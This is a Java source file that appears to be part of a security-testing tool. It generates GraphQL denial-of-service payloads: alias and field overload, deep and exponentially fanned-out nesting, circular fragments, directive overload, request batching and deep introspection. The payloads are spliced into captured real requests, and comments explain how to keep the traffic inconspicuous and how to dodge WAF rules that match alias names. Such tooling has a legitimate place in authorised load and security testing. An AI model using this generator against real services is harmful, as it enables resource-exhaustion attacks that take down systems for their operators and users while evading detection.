package gqldos;

import java.util.List;

/**
 * Generates GraphQL payloads for resource-consumption testing.
 *
 * Every vector scales with a single integer N. Where the operator supplies a
 * captured request body, the original JSON envelope is preserved and only the
 * "query" value is replaced -- so operationName, variables, extensions and any
 * other transport fields survive untouched and the payload stays
 * indistinguishable from real traffic apart from the multiplied selection.
 */
public final class PayloadFactory {

    public enum Vector {
        ALIAS_OVERLOAD("Alias overload", "N aliased copies of the operation's top-level fields."),
        FIELD_DUPLICATION("Field duplication", "Same field repeated N times without aliases (tests dedupe)."),
        DEEP_NESTING("Deep nesting", "One field nested N levels deep through a cyclic relation."),
        CIRCULAR_FRAGMENT("Circular fragments", "Chain of N fragments closing into a cycle (tests validator)."),
        DIRECTIVE_OVERLOAD("Directive overload", "N directives on one field (tests validator, not resolver)."),
        ARRAY_BATCH("Array batching", "JSON array of N independent operations in one request."),
        INTROSPECTION_DEPTH("Deep introspection", "__schema walked N levels through ofType."),
        NESTED_ALIAS("Nested + alias", "N aliases at each of N nesting levels -- cost grows ~fan-out^N.");

        public final String label;
        public final String help;

        Vector(String label, String help) {
            this.label = label;
            this.help = help;
        }

        @Override
        public String toString() {
            return label;
        }
    }

    /** Operator-supplied inputs. */
    public static final class Config {
        /** Root field with args, e.g. {@code user(id:1)}. Schema-fields mode only. */
        public String rootField = "user(id:1)";
        /** Leaf selection inside the root field. Schema-fields mode only. */
        public String leafField = "name";
        /** Self-referencing edge used for nesting, e.g. {@code friends}. */
        public String cycleField = "friends";
        /** Type name the cycle field returns, for fragment payloads. */
        public String typeName = "User";
        /** Fan-out per level for the nested-alias vector. 2-3 is plenty. */
        public int breadth = 2;
        /** Operation name used when building an envelope from scratch. */
        public String opName = "DoSProbe";
        /**
         * Prefix for generated aliases. Aliases are prefix + index, so "a"
         * gives a0, a1... Change it when the default pattern is being matched
         * by a WAF rule, or to blend with the client's own naming.
         */
        public String aliasPrefix = "a";

        /**
         * The captured request. Either a full JSON body copied from Burp
         * (preferred -- every transport field is then preserved) or a bare
         * GraphQL operation, in which case a minimal envelope is synthesised.
         */
        public String requestBody = "";

        public boolean rawMode() {
            return requestBody != null && !requestBody.trim().isEmpty();
        }
    }

    private PayloadFactory() {
    }

    /** Builds the HTTP request body for the given vector at size N. */
    public static String body(Vector v, Config c, int n) {
        return c.rawMode() ? rawBody(v, c, n) : schemaBody(v, c, n);
    }

    /** Vectors that need a recursive edge in the schema. */
    public static boolean needsCycle(Vector v) {
        return v == Vector.DEEP_NESTING || v == Vector.NESTED_ALIAS || v == Vector.CIRCULAR_FRAGMENT;
    }

    // ------------------------------------------------------------- raw mode

    private static String rawBody(Vector v, Config c, int n) {
        String src = c.requestBody.trim();

        // An array body is a batch already: use its first element as template.
        String template = src.startsWith("[") ? firstArrayElement(src) : src;
        int[] span = template.startsWith("{") ? topLevelStringSpan(template, "query") : null;
        boolean hasEnvelope = span != null;

        String doc = hasEnvelope
                ? unescape(template.substring(span[0], span[1]))
                : template;

        if (v == Vector.INTROSPECTION_DEPTH) {
            return wrap(template, span, introspectionDepth(c, n), c);
        }
        if (needsCycle(v)) {
            throw new IllegalStateException(v.label
                    + " needs a self-referencing field. This operation has no recursive edge, "
                    + "so the vector does not apply to this schema.");
        }

        RawQuery q = RawQuery.parse(doc);
        List<String> fields = q.topLevelFields();
        if (fields.isEmpty()) {
            throw new IllegalStateException("no top-level fields found in the operation");
        }

        if (v == Vector.ARRAY_BATCH) {
            // N copies of the untouched original request, as a JSON array.
            String one = hasEnvelope ? template : jsonEnvelope(doc, null, q.name);
            StringBuilder sb = new StringBuilder("[");
            for (int i = 0; i < n; i++) {
                if (i > 0) {
                    sb.append(',');
                }
                sb.append(one);
            }
            return sb.append(']').toString();
        }

        StringBuilder sel = new StringBuilder();
        if (v == Vector.DIRECTIVE_OVERLOAD) {
            StringBuilder d = new StringBuilder();
            for (int x = 0; x < n; x++) {
                d.append(" @d").append(x % 32);
            }
            for (int k = 0; k < fields.size(); k++) {
                sel.append("  ").append(alias(c, k, -1)).append(": ")
                   .append(RawQuery.withDirectives(fields.get(k), d.toString())).append('\n');
            }
        } else {
            for (int i = 0; i < n; i++) {
                for (int k = 0; k < fields.size(); k++) {
                    if (v == Vector.FIELD_DUPLICATION) {
                        sel.append("  ").append(fields.get(k)).append('\n');
                    } else {
                        sel.append("  ").append(alias(c, i, fields.size() > 1 ? k : -1))
                           .append(": ").append(fields.get(k)).append('\n');
                    }
                }
            }
        }

        // Keep the original operation name: the envelope's operationName must
        // still resolve, and matching traffic is less conspicuous.
        String newDoc = q.header() + " {\n" + sel + "}"
                + (q.trailing.isEmpty() ? "" : "\n" + q.trailing);
        return wrap(template, span, newDoc, c);
    }

    /** Splices a document into the captured envelope, or synthesises one. */
    private static String wrap(String template, int[] span, String doc, Config c) {
        if (span != null) {
            return template.substring(0, span[0]) + escape(doc) + template.substring(span[1]);
        }
        String name;
        try {
            name = RawQuery.parse(doc).name;
        } catch (RuntimeException e) {
            name = c.opName;
        }
        return jsonEnvelope(doc, null, name);
    }

    // ---------------------------------------------------------- schema mode

    private static String schemaBody(Vector v, Config c, int n) {
        if (v == Vector.ARRAY_BATCH) {
            String one = jsonEnvelope(aliasOverload(c, 1), null, c.opName);
            StringBuilder sb = new StringBuilder("[");
            for (int i = 0; i < n; i++) {
                if (i > 0) {
                    sb.append(',');
                }
                sb.append(one);
            }
            return sb.append(']').toString();
        }
        return jsonEnvelope(query(v, c, n), null, c.opName);
    }

    /** Builds just the GraphQL document in schema-fields mode. */
    public static String query(Vector v, Config c, int n) {
        switch (v) {
            case ALIAS_OVERLOAD:     return aliasOverload(c, n);
            case FIELD_DUPLICATION:  return fieldDuplication(c, n);
            case DEEP_NESTING:       return deepNesting(c, n);
            case CIRCULAR_FRAGMENT:  return circularFragment(c, n);
            case DIRECTIVE_OVERLOAD: return directiveOverload(c, n);
            case INTROSPECTION_DEPTH:return introspectionDepth(c, n);
            case NESTED_ALIAS:       return nestedAlias(c, n);
            case ARRAY_BATCH:        return aliasOverload(c, 1);
            default: throw new IllegalArgumentException("unhandled vector: " + v);
        }
    }

    private static String aliasOverload(Config c, int n) {
        StringBuilder sb = new StringBuilder("query ").append(c.opName).append(" {\n");
        for (int i = 0; i < n; i++) {
            sb.append("  ").append(alias(c, i, -1)).append(": ")
              .append(c.rootField).append(selection(c.leafField)).append('\n');
        }
        return sb.append('}').toString();
    }

    private static String fieldDuplication(Config c, int n) {
        StringBuilder sb = new StringBuilder("query ").append(c.opName).append(" {\n");
        for (int i = 0; i < n; i++) {
            sb.append("  ").append(c.rootField).append(selection(c.leafField)).append('\n');
        }
        return sb.append('}').toString();
    }

    private static String deepNesting(Config c, int n) {
        StringBuilder sb = new StringBuilder("query ").append(c.opName).append(" { ")
                .append(c.rootField).append(" { ");
        for (int i = 0; i < n; i++) {
            sb.append(c.cycleField).append(" { ");
        }
        sb.append(blank(c.leafField) ? "__typename" : c.leafField).append(' ');
        for (int i = 0; i < n; i++) {
            sb.append("} ");
        }
        return sb.append("} }").toString();
    }

    private static String circularFragment(Config c, int n) {
        int count = Math.max(2, n);
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < count; i++) {
            sb.append("fragment f").append(i).append(" on ").append(c.typeName)
              .append(" { ").append(c.cycleField).append(" { ...f").append((i + 1) % count).append(" } }\n");
        }
        sb.append("query ").append(c.opName).append(" { ").append(c.rootField).append(" { ...f0 } }");
        return sb.toString();
    }

    private static String directiveOverload(Config c, int n) {
        StringBuilder sb = new StringBuilder("query ").append(c.opName).append(" { ").append(c.rootField);
        for (int i = 0; i < n; i++) {
            sb.append(" @d").append(i % 32);
        }
        return sb.append(selection(c.leafField)).append(" }").toString();
    }

    private static String introspectionDepth(Config c, int n) {
        StringBuilder sb = new StringBuilder("query ").append(c.opName)
                .append(" { __schema { types { fields { type { ");
        for (int i = 0; i < n; i++) {
            sb.append("ofType { ");
        }
        sb.append("name ");
        for (int i = 0; i < n; i++) {
            sb.append("} ");
        }
        return sb.append("} } } } }").toString();
    }

    /**
     * Layered fragments: each level references the level below it fan-out
     * times. The document stays O(fan-out * depth) bytes while a server that
     * expands fragments before costing the query resolves fan-out^depth nodes.
     * N is the depth here, not a node count.
     */
    private static String nestedAlias(Config c, int n) {
        int depth = Math.max(1, n);
        int breadth = Math.max(2, c.breadth);
        String leaf = blank(c.leafField) ? "__typename" : c.leafField;

        StringBuilder sb = new StringBuilder();
        sb.append("fragment L0 on ").append(c.typeName).append(" { ").append(leaf).append(" }\n");
        for (int d = 1; d <= depth; d++) {
            sb.append("fragment L").append(d).append(" on ").append(c.typeName).append(" { ");
            for (int b = 0; b < breadth; b++) {
                sb.append("b").append(b).append(": ").append(c.cycleField)
                  .append(" { ...L").append(d - 1).append(" } ");
            }
            sb.append("}\n");
        }
        sb.append("query ").append(c.opName).append(" { ")
          .append(c.rootField).append(" { ...L").append(depth).append(" } }");
        return sb.toString();
    }

    // ---------------------------------------------------------------- helpers

    /**
     * Builds one alias name. GraphQL aliases must start with a letter or
     * underscore and continue with letters, digits or underscores, so a bad
     * prefix is sanitised rather than producing an unparseable document.
     */
    private static String alias(Config c, int i, int k) {
        String p = (c.aliasPrefix == null || c.aliasPrefix.trim().isEmpty()) ? "a" : c.aliasPrefix.trim();
        StringBuilder sb = new StringBuilder();
        for (int x = 0; x < p.length(); x++) {
            char ch = p.charAt(x);
            if (x == 0 && !(Character.isLetter(ch) || ch == '_')) {
                sb.append('a');
            }
            sb.append(Character.isLetterOrDigit(ch) || ch == '_' ? ch : '_');
        }
        sb.append(i);
        if (k >= 0) {
            sb.append('_').append(k);
        }
        return sb.toString();
    }

    private static String selection(String leaf) {
        return blank(leaf) ? "" : " { " + leaf + " }";
    }

    private static boolean blank(String s) {
        return s == null || s.trim().isEmpty();
    }

    /** Minimal envelope used only when no captured body is available. */
    public static String jsonEnvelope(String doc, String variablesJson, String operationName) {
        StringBuilder sb = new StringBuilder("{");
        if (operationName != null && !operationName.trim().isEmpty()) {
            sb.append("\"operationName\":\"").append(escape(operationName.trim())).append("\",");
        }
        sb.append("\"query\":\"").append(escape(doc)).append('"');
        if (variablesJson != null && !variablesJson.trim().isEmpty()) {
            sb.append(",\"variables\":").append(variablesJson.trim());
        }
        return sb.append('}').toString();
    }

    /**
     * Locates the content of a top-level JSON string value by key.
     * Returns {startInclusive, endExclusive} of the raw, still-escaped content,
     * or null if the key is absent at depth 1.
     */
    static int[] topLevelStringSpan(String json, String key) {
        int depth = 0;
        boolean inStr = false;
        int strStart = -1;
        for (int i = 0; i < json.length(); i++) {
            char ch = json.charAt(i);
            if (inStr) {
                if (ch == '\\') {
                    i++;
                } else if (ch == '"') {
                    inStr = false;
                    if (depth == 1) {
                        String tok = json.substring(strStart + 1, i);
                        if (tok.equals(key)) {
                            int j = i + 1;
                            while (j < json.length() && Character.isWhitespace(json.charAt(j))) {
                                j++;
                            }
                            if (j < json.length() && json.charAt(j) == ':') {
                                j++;
                                while (j < json.length() && Character.isWhitespace(json.charAt(j))) {
                                    j++;
                                }
                                if (j < json.length() && json.charAt(j) == '"') {
                                    int s = j + 1;
                                    for (int p = s; p < json.length(); p++) {
                                        char c2 = json.charAt(p);
                                        if (c2 == '\\') {
                                            p++;
                                        } else if (c2 == '"') {
                                            return new int[]{s, p};
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                continue;
            }
            if (ch == '"') {
                inStr = true;
                strStart = i;
            } else if (ch == '{' || ch == '[') {
                depth++;
            } else if (ch == '}' || ch == ']') {
                depth--;
            }
        }
        return null;
    }

    /** Returns the first element of a JSON array body. */
    private static String firstArrayElement(String json) {
        int open = json.indexOf('{');
        if (open < 0) {
            return json;
        }
        int depth = 0;
        boolean inStr = false;
        for (int i = open; i < json.length(); i++) {
            char ch = json.charAt(i);
            if (inStr) {
                if (ch == '\\') {
                    i++;
                } else if (ch == '"') {
                    inStr = false;
                }
                continue;
            }
            if (ch == '"') {
                inStr = true;
            } else if (ch == '{') {
                depth++;
            } else if (ch == '}' && --depth == 0) {
                return json.substring(open, i + 1);
            }
        }
        return json;
    }

    static String escape(String s) {
        StringBuilder sb = new StringBuilder(s.length() + 32);
        for (int i = 0; i < s.length(); i++) {
            char ch = s.charAt(i);
            switch (ch) {
                case '"':  sb.append("\\\""); break;
                case '\\': sb.append("\\\\"); break;
                case '\n': sb.append("\\n");  break;
                case '\r': sb.append("\\r");  break;
                case '\t': sb.append("\\t");  break;
                default:
                    if (ch < 0x20) {
                        sb.append(String.format("\\u%04x", (int) ch));
                    } else {
                        sb.append(ch);
                    }
            }
        }
        return sb.toString();
    }

    static String unescape(String s) {
        StringBuilder sb = new StringBuilder(s.length());
        for (int i = 0; i < s.length(); i++) {
            char ch = s.charAt(i);
            if (ch != '\\' || i + 1 >= s.length()) {
                sb.append(ch);
                continue;
            }
            char nx = s.charAt(++i);
            switch (nx) {
                case 'n':  sb.append('\n'); break;
                case 't':  sb.append('\t'); break;
                case 'r':  sb.append('\r'); break;
                case 'b':  sb.append('\b'); break;
                case 'f':  sb.append('\f'); break;
                case '"':  sb.append('"');  break;
                case '/':  sb.append('/');  break;
                case '\\': sb.append('\\'); break;
                case 'u':
                    if (i + 4 < s.length()) {
                        sb.append((char) Integer.parseInt(s.substring(i + 1, i + 5), 16));
                        i += 4;
                    }
                    break;
                default: sb.append(nx);
            }
        }
        return sb.toString();
    }

    /** Rough estimate of how many nodes the server is asked to resolve. */
    public static long estimatedNodes(Vector v, Config c, int n) {
        if (v == Vector.NESTED_ALIAS) {
            double nodes = Math.pow(Math.max(2, c.breadth), Math.max(1, n));
            return (nodes >= Long.MAX_VALUE || Double.isInfinite(nodes)) ? Long.MAX_VALUE : (long) nodes;
        }
        return n;
    }
}
